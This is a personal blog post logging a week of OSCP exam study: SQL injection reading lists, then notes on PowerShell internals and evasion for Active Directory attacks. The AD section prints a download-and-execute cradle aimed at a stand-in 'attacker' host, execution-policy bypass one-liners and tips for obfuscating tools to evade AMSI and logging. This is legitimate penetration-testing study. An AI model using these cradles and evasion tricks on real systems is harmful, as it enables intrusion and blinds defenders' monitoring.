---
title: Week 1 of my OSCP preparation 
date: 2025-07-21 1:00:00 + 05:30
categories: [OSCP Prep]
tags: [oscp, sqli, ad]    # TAG names should always be lowercase
description: Where have I been? Update on the CPTS journey, and the start of the OSCP journey
---
# Week 1 of my OSCP preparation
![](/assets/images/futur___dusk_by_khurt_x_kate_dimqihb-pre.jpg)
### TLDR
If you want to skip straight to the technical learning portion of this week, just scroll down to the `OSCP Prep` , as I will be starting this post with an update.

## Update on CPTS journey and cheatsheets

I started this blog to share cheatsheets and learning resources for the CPTS exam by HackTheBox. I am happy to share that I have attempted this exam and got the 12 flags I needed to pass, as of writing this post, I am waiting for my CPTS results. 
I think that the cheatsheets I shared are not good enough, I am leaving the nmap and the footprinting one up for now. When I pass both the OSCP and the CPTS I will be making the notes I have made, public. During my Summer break, I extensively studied and redid the CPTS path modules and made a "Field Manual" based on a post by Bruno Moura. This is the post I am talking about - [HTB CPTS Tips & Tricks](https://www.brunorochamoura.com/posts/cpts-tips/). If you want to learn about the note taking methodology that Bruno follows check out this video - [Creating A Field Manual](https://www.brunorochamoura.com/posts/field-manual/).
This field manual along with learning most of the concepts in depth allowed me to get a passing score on the CPTS, and I can't wait to share it. However, by the end of my learning, I was too burnt out to document stuff. I would copy-paste the module into chatgpt and ask it to create entries for me. This worked, however, I am not satisfied with the quality of it personally. I might try to make it better later when I get time otherwise I can shorten some contents as much as possible and add more references to modules and blogs instead.

## What else have I been upto? and what more will I be posting...

Well, I visited Bsides Mumbai this month, which was my first cybersec conference. I met a few of my online friends who help me with rooting boxes on HTB and I also met many new people. It was recommended to me that I start a blog, I mean I already have one, but I was told to create writeups as a proof of work. This is exactly my next plan. In the below sections I am detailing my learnings for the week but in a couple weeks or so I plan on purchasing a vulnlab voucher and root their chains/machines and make writeups for the same. 

Now the main part :-

## OSCP Prep

This was my first week of preparation for the OSCP. I am planning on targeting the exam in Diwali, that is October when I have a break. As per my CPTS experience, my current weak point is AD, in fact I wasted over 2 days on it in the exam, I would talk more about that in depth in another blog post where I would share tips for acing it when I get my result and I pass. I am quite decent with web exploitation. However, using automated tools like `sqlmap` or `metasploit` isn't allowed on the OSCP. A large part of credit for my CPTS performance also belongs to ChatGPT, as it helped me fix exploits and tunnels and pivots, unfortunately LLMs too, are banned. Therefore I am trying to become independent of AI and automated tools for exploitation.
Now for my preparation, I am learning AD from some course dumps that I have found (I'd rather not reveal which) plus I plan to learn 1 web bug/vulnerability per week. Let's start with Web

### Web - SQL Injections

I am learning web from Portswigger labs. I had already finished the SQLi Labs (the ones that didn't need a collaborator) so this one was more of a revision to be honest. 
This resource - [SQL Injection CheatSheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) was very helpful while redoing the labs.
Also, I read these 10 posts/reports sharing how SQL injections were discovered in real applications. Here are the blogs I read which helped me understand this vulnerability deeply.

1. [https://systemweakness.com/how-finding-an-sql-injection-vulnerability-earned-a-1000-bug-bounty-af2ee0b62f6c](https://systemweakness.com/how-finding-an-sql-injection-vulnerability-earned-a-1000-bug-bounty-af2ee0b62f6c) - This blog covered the basic methodology behind exploiting an SQL injection.
2. [https://medium.com/%40anonymousshetty2003/sql-injection-in-hidden-contact-form-parameter-660bd1281491](https://medium.com/%40anonymousshetty2003/sql-injection-in-hidden-contact-form-parameter-660bd1281491) - This blog talks about finding SQL injection in a contact form.
3. [https://medium.com/%40nirdesh123raya/my-journey-of-sql-injection-and-database-dump-in-a-real-world-target-575908da2e65](https://medium.com/%40nirdesh123raya/my-journey-of-sql-injection-and-database-dump-in-a-real-world-target-575908da2e65) - In this blog, the author used something called a polyglot XSS payload to trigger a failure confirming that the target is vulnerable to SQLi. I need to learn about polyglot payloads as this is a new topic for me. Apparently these are payloads that are designed to work across multiple points of injection.
4. [https://infosecwriteups.com/from-cookie-consent-to-command-execution-a-real-world-sqli-full-pii-leak-to-rce-on-a-careers-a8c554521d9e](https://infosecwriteups.com/from-cookie-consent-to-command-execution-a-real-world-sqli-full-pii-leak-to-rce-on-a-careers-a8c554521d9e) - The author of this blog, performed an attack by injecting the `cookieConsent` parameter, which is the parameter that was sent to the backend server when the user clicked on `Accept all cookies` option.
5. [https://medium.com/%400x3adly/from-sql-injection-to-rce-leveraging-vulnerability-for-maximum-impact-2fb356907eed](https://medium.com/%400x3adly/from-sql-injection-to-rce-leveraging-vulnerability-for-maximum-impact-2fb356907eed) - This blog covers popular RCE methods using SQLi, from `load_file()` to `xp_cmdshell` and os shell using sqlmap. UDFs and PostgreSQL extensions were new methods for me. In fact, I think I need to read about them in detail as I haven't understood them properly.
6. [https://infosecwriteups.com/how-i-found-multiple-sql-injections-in-5-minutes-in-bug-bounty-40155964c498](https://infosecwriteups.com/how-i-found-multiple-sql-injections-in-5-minutes-in-bug-bounty-40155964c498) - This blog was about finding SQL injections in hidden parameters. I think this blog and the one with the `cookieConsent` parameter are most interesting blogs I've read.
7. [https://hackerone.com/reports/1044698](https://hackerone.com/reports/1044698) This hackerone disclosed report shows how a researcher found a time based SQLi and XSS (need to learn XSS) in an api endpoint.
8. [https://hackerone.com/reports/1525200](https://hackerone.com/reports/1525200) This report was about CVE-2021-38159 which was SQLi in MOVEit Transfer. Detailed report - https://blog.viettelcybersecurity.com/moveit-transfer-cve/
9. [https://hackerone.com/reports/2051931](https://hackerone.com/reports/2051931) This report reveals a Blind SQLi on an api in in-drive.
10. [https://hackerone.com/reports/273946] (https://hackerone.com/reports/273946) Again, last but the best of all reports, this was a vulnerability in a WordPress plugin which the researcher exploited to dump the credentials. This one was my favorite of all 4 hacktivity reports and I recommend everyone should read it.

Besides these I also read about OAST - [https://portswigger.net/burp/application-security-testing/oast](https://portswigger.net/burp/application-security-testing/oast)
I don't think I understand this totally as it includes usage of collaborator which is a pro feature but I have a basic idea of how out of band testing works.

### AD 

I already have a decent idea about Windows and AD from CPTS. However, I believe I need more practice and knowledge. Not just in terms of exploitation, but I also need to learn evasion to become a successful red teamer/pentester.

I am reading this blog - [PowerShell ♥ the Blue Team](https://devblogs.microsoft.com/powershell/powershell-the-blue-team/) and I am not yet through it right now.

Besides this, I learnt the following things this week which I found to be quite interesting. 

- PowerShell Internals

a. PowerShell's real engine is `System.Management.Automation.dll`, not `powershell.exe`.

b. `powershell.exe` is just the CLI interface that loads the DLL and starts a REPL (read-eval-print loop).

c. This separation allows attackers to bypass detections by directly invoking the DLL from C# or other .NET code.

d. Scripts can be executed in-memory, skipping `powershell.exe` entirely, which helps avoid logging.

e. `pwsh` on macOS and linux call the powershell core which is a platform agnostic implementation of powershell.

- Download-Execute Cradles

A Download-Execute Cradle is a one-liner that downloads a remote PowerShell script and executes it directly in memory using `iex`

Example:

  ```powershell
  iex (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')
  ```
 `iex` stands for `Invoke-Expression` - it executes strings as code.
 The full line is the cradle - `iex` is the executor within it.


- PowerShell Detection Mechanisms

| Feature                               | Function                                                                     |
| ------------------------------------- | ---------------------------------------------------------------------------- |
| System-Wide Transcription         | Logs full PowerShell input/output to text files                              |
| Script Block Logging              | Logs entire script blocks, including dynamically generated code              |
| AMSI (AntiMalware Scan Interface) | Sends code to Defender/EDR before execution                                  |
| CLM (Constrained Language Mode)   | Restricts PowerShell to safe, limited cmdlets - blocks reflection, .NET, COM |

All of the above can be bypassed by red teamers with the right tools and techniques.

- Execution Policy != Security controls

PowerShell Execution Policy is not a security feature - it just prevents accidental script execution.
Common policies: `Restricted`, `RemoteSigned`, `Unrestricted`, `Bypass`.
You can bypass it without admin using:

   `powershell.exe -ExecutionPolicy Bypass`
   `$env:PSExecutionPolicyPreference = "Bypass"`
   `-EncodedCommand` for base64 payloads
It does not block or log anything - completely bypassable.

- AMSI, Logging, and CLM Bypass Tools

- Invisi-Shell

Uses CLR (Common Language Runtime) Profiler API to hook and patch `System.Management.Automation.dll` and `System.Core.dll`.
Disables logging like Script Block Logging and Transcription.
Runs via a few `.bat` files and profiler environment variables.
OPSEC caution: it’s signatured; must be recompiled and obfuscated.

- Payload Fingerprint Testing & Obfuscation

a. AmsiTrigger

Finds which lines or tokens in your script are triggering AMSI.
Helps in debugging payloads and identifying sensitive strings.

b. DefenderCheck

Tests whether your script or EXE gets flagged by Windows Defender.
Lets you verify stealth before delivery.
Can even be used to check if DefenderCheck itself is getting detected (meta!).

- Invoke-Obfuscation

Tool to obfuscate PowerShell scripts using Token reordering, AST manipulation, String encoding.
Used to defeat AMSI/AV/EDR signatures.
Never upload or drop this tool directly to target - run locally only.
Obfuscate the tool itself if you want to keep it stealthy:
  Rename function names
  Remove author info
  Strip metadata

## Conclusion (and goals for next week)

My goal for next week is to finish a large part of AD and try to learn and finish 2 new web vulnerabilites from portswigger. Considering the time spent in college activities, this goal is kinda unrealistic but I can always try to push myself harder (Aim for the stars and you shall reach the moon).

I am not totally satisfied with this week's progress as I was busy with college and couldn't dedicate as much time to it as I could have otherwise. I hope to achieve next week's goals. If you read it this far, thank you for reading and feel free to connect on twitter and linkedin if you don't already. 

Art I used - https://www.deviantart.com/khurt-x-kate/art/Futur-Dusk-1126579727
